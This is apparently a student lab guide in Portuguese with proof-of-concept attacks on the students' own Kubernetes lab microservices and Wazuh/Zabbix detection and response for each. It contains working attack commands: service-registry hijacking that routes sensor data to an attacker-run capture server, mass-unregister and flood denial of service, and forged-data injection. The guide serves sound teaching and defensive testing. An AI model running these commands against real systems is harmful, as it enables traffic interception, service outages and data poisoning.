# How-To: Proof-of-Concept das 3 Ameaças — SSLE Projeto 1

Guia reexecutável das PoCs, incluindo deteção e resposta automática
(Fase 4). Pensado para a demo: cada secção é autossuficiente e pode ser
corrida de novo perante o avaliador.

## Pré-requisitos e variáveis

Todos os comandos correm a partir da **VM Debian hospedeira** (`lucas@ssle`).
Definir primeiro as variáveis (reexecutar sempre que abrir um terminal novo):

```bash
MASTER=10.255.255.42          # IP eth0 do k3s-master (confirmar com: incus list)
ATTACKER=10.255.255.184       # IP eth0 do contentor atacante
```

Confirmar que estão definidas antes de cada bloco:
```bash
echo "MASTER=$MASTER  ATTACKER=$ATTACKER"
```

> Nota de rede: os NodePorts (30050/30001/30003) são alcançáveis de
> qualquer contentor Incus no site. Os IPs de pod (`10.42.x.x`) só são
> alcançáveis de DENTRO de um nó do cluster (`k3s-master`/`k3s-node1`),
> não do contentor `attacker`. Isto condiciona a PoC 3 (ver lá).

### Checklist de pré-requisitos — correr SEMPRE antes da demo

Todos os componentes de suporte (atacante e deteção/resposta) são
geridos por `systemd` e sobrevivem a reinícios dos contentores, mas vale
a pena confirmar antes de começar:

```bash
incus exec attacker -- systemctl is-active fake-storage
incus exec k3s-master -- systemctl is-active ssle-registry-stream ssle-ingestion-stream ssle-analytics-poll ssle-responder
incus exec k3s-master -- cat /var/ossec/var/run/wazuh-agentd.state | grep status
incus exec wazuh-container -- systemctl is-active wazuh-manager
```

Esperado: todas as linhas `active`, e `status='connected'` no agente
Wazuh. Se algum serviço não arrancar sozinho (não deveria acontecer,
mas por segurança):
```bash
incus exec attacker -- systemctl restart fake-storage
incus exec k3s-master -- systemctl restart ssle-registry-stream ssle-ingestion-stream ssle-analytics-poll ssle-responder
```

---

## Setup único — contentor atacante

Só precisa de ser feito uma vez. O "fake storage" responde 200 em
`/health` (para sobreviver ao health-checker do registry) e regista o que
receber em `POST /store`. Corre como serviço `systemd` (`/opt`, não
`/tmp`) para sobreviver a reinícios do contentor.

```bash
# criar o contentor (saltar se já existir)
incus launch images:debian/trixie attacker
incus exec attacker -- bash -c 'apt-get update -qq && apt-get install -y -qq python3 curl'

# escrever o servidor fake em /opt (persistente, ao contrário de /tmp)
incus exec attacker -- bash -c "cat > /opt/fake_storage.py" << 'PYEOF'
from http.server import BaseHTTPRequestHandler, HTTPServer
import datetime

class H(BaseHTTPRequestHandler):
    def log_message(self, fmt, *args):
        print('[' + datetime.datetime.now().isoformat() + '] ' + (fmt % args), flush=True)
    def do_GET(self):
        self.send_response(200); self.end_headers()
        self.wfile.write(b'{"status":"ok"}')
    def do_POST(self):
        length = int(self.headers.get('Content-Length', 0))
        body = self.rfile.read(length)
        print('[INTERCEPT] ' + self.path + ' <- ' + body.decode(errors='replace'), flush=True)
        self.send_response(200); self.end_headers()
        self.wfile.write(b'{"status":"intercepted"}')

HTTPServer(('0.0.0.0', 9999), H).serve_forever()
PYEOF

# registar como serviço systemd (Restart=always, sobrevive a reboots)
incus exec attacker -- bash -c 'cat > /etc/systemd/system/fake-storage.service << EOF
[Unit]
Description=Fake storage endpoint for hijacking PoC
After=network.target

[Service]
ExecStart=/usr/bin/python3 /opt/fake_storage.py
Restart=always
RestartSec=3

[Install]
WantedBy=multi-user.target
EOF'

incus exec attacker -- systemctl daemon-reload
incus exec attacker -- systemctl enable --now fake-storage

# confirmar
incus exec attacker -- curl -s http://localhost:9999/health    # → {"status":"ok"}
```

---

## Evidência "antes" (baseline) — correr antes das PoCs

```bash
mkdir -p ~/evidencia/antes
incus exec k3s-master -- k3s kubectl -n ssle get pods,svc,netpol -o wide | tee ~/evidencia/antes/01-topologia.txt
incus exec attacker -- curl -s "http://$MASTER:30050/services" | python3 -m json.tool | tee ~/evidencia/antes/02-registry-services.json
```

---

## PoC 1 — Route/Signals Hijacking

Explora a ausência total de autenticação no Service Registry: qualquer
cliente pode registar uma instância com qualquer nome, e `DELETE
/unregister` sem `instance_id` remove todas as instâncias de um serviço
de uma vez.

### Fase A — registar storage falso e provar o desvio de tráfego
```bash
# registar instância falsa apontando para o atacante
incus exec attacker -- curl -s -X POST "http://$MASTER:30050/register" -H "Content-Type: application/json" -d "{\"name\":\"storage-service\",\"url\":\"http://$ATTACKER:9999\",\"instance_id\":\"xx.evil.dc-evil.rack0.nodeX.storage-service.pwned\",\"location\":{\"country\":\"xx\",\"region\":\"evil\",\"datacenter\":\"dc-evil\",\"rack\":\"rack0\",\"node\":\"nodeX\"}}"

# provar o round-robin a alternar entre real e falso
for i in 1 2 3 4 5 6; do incus exec attacker -- curl -s "http://$MASTER:30050/services/storage-service" | python3 -c "import sys,json; print(json.load(sys.stdin)['instance_id'])"; sleep 1; done | tee ~/evidencia/poc1-roundrobin-alternancia.txt

# ver dados reais do sensor a chegar ao atacante
incus exec attacker -- journalctl -u fake-storage --no-pager -n 30 | tee ~/evidencia/poc1-intercepted-data.log
```
**Esperado:** o loop alterna entre `...storage-f6f4dbd-lvwth` (real) e
`...pwned` (falso); o log mostra `[INTERCEPT] /store <- {...}` com
temperaturas reais do sensor.

### Fase B — DoS via unregister em massa
```bash
# um único pedido apaga TODAS as instâncias de storage (real + falsa)
incus exec attacker -- curl -s -X DELETE "http://$MASTER:30050/unregister" -H "Content-Type: application/json" -d '{"name":"storage-service"}'

# confirmar o impacto e a autorrecuperação (heartbeat ~15s)
incus exec attacker -- curl -s "http://$MASTER:30050/services/storage-service" | tee ~/evidencia/poc1-unregister-dos.json
```
**Esperado:** `{"message":"unregistered"}`; ao fim de ~15s o storage real
volta (via heartbeat), mas o falso não (não implementa heartbeat).

### Fase C — deteção e resposta automática (Fase 4)

```bash
# dispara um ataque igual ao da Fase A, com instance_id novo
incus exec attacker -- curl -s -X POST "http://$MASTER:30050/register" -H "Content-Type: application/json" -d '{"name":"storage-service","url":"http://10.255.255.184:9999","instance_id":"xx.evil.demo.storage-service.pwnedZZZ","location":{"country":"xx"}}'

sleep 10

# deteção: Wazuh (regra 100102 — registo malicioso) e Zabbix (Problems)
incus exec wazuh-container -- grep -B5 "pwnedZZZ" /var/ossec/logs/alerts/alerts.log | grep "Rule:"

# resposta: remoção automática, SELETIVA (só a maliciosa)
incus exec wazuh-container -- tail -3 /var/ossec/logs/active-responses.log
incus exec attacker -- curl -s "http://$MASTER:30050/services/storage-service"
```
**Esperado:** `Rule: 100102 (level 12)`; `removed instance:
xx.evil.demo.storage-service.pwnedZZZ`; a instância real continua
registada, **sem interrupção** (mesmo `registered_at` de antes do
ataque). Para o cenário de remoção em massa (Fase B), a regra `100103`
deteta (sem resposta automática — mitigação é correção de código,
documentada no relatório).

---

## PoC 2 — Massive Denial-of-Service

Explora dois vetores: `limit=-1` em `/anomalies` (SQLite interpreta
como "sem limite"), e ausência de rate limiting em `/ingest`.

### Vetor 1 — unbounded query (prova quantitativa)
```bash
# baseline normal
incus exec attacker -- bash -c 'time curl -s "http://'"$MASTER"':30003/anomalies?limit=100" -o /tmp/dump_normal.json'
# malicioso: limit=-1 → SQLite interpreta como ilimitado
incus exec attacker -- bash -c 'time curl -s "http://'"$MASTER"':30003/anomalies?limit=-1" -o /tmp/dump.json'
incus exec attacker -- wc -c /tmp/dump.json /tmp/dump_normal.json
```
**Esperado:** `limit=-1` ~27x mais lento (~2.8s vs ~0.1s), ~290KB vs poucos KB.

### Vetor 2 — flood amplificado (correr 2–3x para ver degradação cumulativa)
```bash
incus exec attacker -- bash -c 'seq 200 | xargs -P 20 -I{} curl -s -X POST "http://'"$MASTER"':30001/ingest" -H "Content-Type: application/json" -d "{\"device_id\":\"flood-{}\",\"temperature\":25.0}" -o /dev/null -w "%{http_code}\n"' | sort | uniq -c
```
**Esperado:** taxa de 502 variável (0%–76%) consoante o estado de
saturação prévio — a imprevisibilidade É a vulnerabilidade (sem rate limiting).

### Recuperação
```bash
sleep 30
incus exec attacker -- curl -s -w "\n%{http_code}\n" "http://$MASTER:30001/health"   # → 200
incus exec k3s-master -- k3s kubectl -n ssle get pods | tee ~/evidencia/poc2-pods-apos-recuperacao.txt   # ver RESTARTS
```

### Deteção e resposta automática (Fase 4)

```bash
# confirma que não há throttle residual de um teste anterior
incus exec k3s-master -- iptables -L INPUT -n | grep 30001

incus exec attacker -- bash -c 'seq 50 | xargs -P 20 -I{} curl -s -X POST "http://'"$MASTER"':30001/ingest" -H "Content-Type: application/json" -d "{\"device_id\":\"demo-ddos-{}\",\"temperature\":25.0}" -o /dev/null'

sleep 10

# deteção: Wazuh (regra 100201, frequency=30/timeframe=10) e Zabbix
incus exec wazuh-container -- grep -A3 "100201" /var/ossec/logs/alerts/alerts.log | tail -10

# resposta: rate-limit automático via iptables
incus exec k3s-master -- iptables -L INPUT -n | grep 30001
```
**Esperado:** `Rule: 100201 (level 12)`; regras `ACCEPT ... limit: avg
10/sec` + `DROP` aplicadas automaticamente ao NodePort 30001. O throttle
expira sozinho ao fim de 60s (`timeout` do active-response).

---

## PoC 3 — Botnet / Fraude de Dados

Explora a divulgação do IP interno do pod Storage via `GET /services`
(que deveria estar isolado por `ClusterIP`) e a ausência de validação
de gama física no `storage-service`.

> IMPORTANTE: o `POST /store` tem de correr de DENTRO do cluster
> (`k3s-master`), porque o IP do pod (`10.42.x.x`) não é routável do
> contentor `attacker`. A disclosure (Path 1) corre do atacante; a
> escrita (Path 2) corre do nó.

### Fase A — disclosure do IP do pod (Attack Path 1)
```bash
STORAGE_URL=$(incus exec attacker -- curl -s "http://$MASTER:30050/services/storage-service" | python3 -c "import sys,json; print(json.load(sys.stdin)['url'])")
echo "storage pod url: $STORAGE_URL"    # → http://10.42.x.x:5002

# confirmar que NÃO é alcançável de fora do cluster (prova da barreira de rede)
curl -s --max-time 3 "$STORAGE_URL/health"; echo "exit code: $? (28 = timeout, esperado)"
```

### Fase B — escrita direta sem validação (Attack Path 2)
```bash
# valor fisicamente impossível (999°C) aceite sem validação
incus exec k3s-master -- curl -s -w "\n%{http_code}\n" -X POST "$STORAGE_URL/store" -H "Content-Type: application/json" -d "{\"device_id\":\"botnet-spoof-001\",\"temperature\":999.0}"

# simular frota de sensores forjados (botnet)
for i in $(seq 1 15); do incus exec k3s-master -- curl -s -X POST "$STORAGE_URL/store" -H "Content-Type: application/json" -d "{\"device_id\":\"bot-$i\",\"temperature\":$((RANDOM % 400 + 100)).0}"; echo; done
```

### Confirmar o envenenamento
```bash
incus exec attacker -- curl -s "http://$MASTER:30003/average" | tee ~/evidencia/poc3-average-after-botnet.json
```
**Esperado:** `average_temperature` sobe de ~25°C para ~65°C, `max` perto
de várias centenas °C.

### Deteção e resposta automática (Fase 4)

```bash
STORAGE_URL=$(incus exec attacker -- curl -s "http://$MASTER:30050/services/storage-service" | python3 -c "import sys,json; print(json.load(sys.stdin)['url'])")
incus exec k3s-master -- curl -s -X POST "$STORAGE_URL/store" -H "Content-Type: application/json" -d '{"device_id":"demo-fraude","temperature":666.0}'

sleep 8

# deteção: poller próprio + Wazuh (regra 100300) + Zabbix
incus exec k3s-master -- tail -5 /var/log/analytics-poll.log
incus exec wazuh-container -- grep -A3 "100300" /var/ossec/logs/alerts/alerts.log | tail -10

# resposta: registo em quarentena (auditoria, não corretiva — ver relatório 5.3.1)
incus exec wazuh-container -- tail -5 /var/ossec/etc/lists/ssle-fraud-quarantine.log
```
**Esperado:** `[ANOMALY] temperature out of physical range: max=666.0
...`; `Rule: 100300 (level 12)`; entradas `FRAUD_DETECTED` na
quarentena. O alerta Zabbix resolve-se sozinho quando o valor forjado
sai da janela de 100 leituras (diluição natural, não ação do Wazuh).

---

## Como narrar isto na demo (sequência recomendada)

1. Correr o checklist de pré-requisitos (todos os serviços `active`).
2. Mostrar o estado limpo (`/services` com 1 storage real).
3. PoC 1 Fase A — registar o fake, mostrar o log a receber dados reais ao vivo.
4. PoC 1 Fase B — um `DELETE` apaga o serviço todo; mostrar a recuperação.
5. PoC 1 Fase C — repetir o ataque e mostrar a deteção + remoção
   automática e seletiva, sem indisponibilidade.
6. PoC 2 — o `limit=-1` com `time` (número do 27x é visual e imediato),
   depois o flood com deteção + throttle automático.
7. PoC 3 — a média a disparar após a injeção (antes/depois lado a lado),
   depois a escrita única com deteção + registo em quarentena.
8. Em cada uma, apontar o nó correspondente na ADTree respetiva e, nas
   Fases C/deteção, o dashboard do Zabbix (Problems) em paralelo com o
   `alerts.log` do Wazuh.

## Estado da Fase 4 (deteção + resposta) — concluído

As 3 ameaças têm deteção dupla (Wazuh + Zabbix, correlação FCAPS↔
segurança confirmada) e resposta automática:

| Ameaça | Deteção | Resposta |
|---|---|---|
| 1 — Hijacking | Wazuh 100100/100101/100102/100103 + Zabbix | Remoção seletiva, sem indisponibilidade |
| 2 — DDoS | Wazuh 100200/100201 + Zabbix | Rate-limit via iptables (timeout 60s) |
| 3 — Fraude | Wazuh 100300 + Zabbix | Registo em quarentena (auditoria, não corretiva) |

Detalhe técnico, achados e limitações de cada resposta: ver Secções
5.1.1/5.1.2, 5.2.1 e 5.3.1 do relatório.
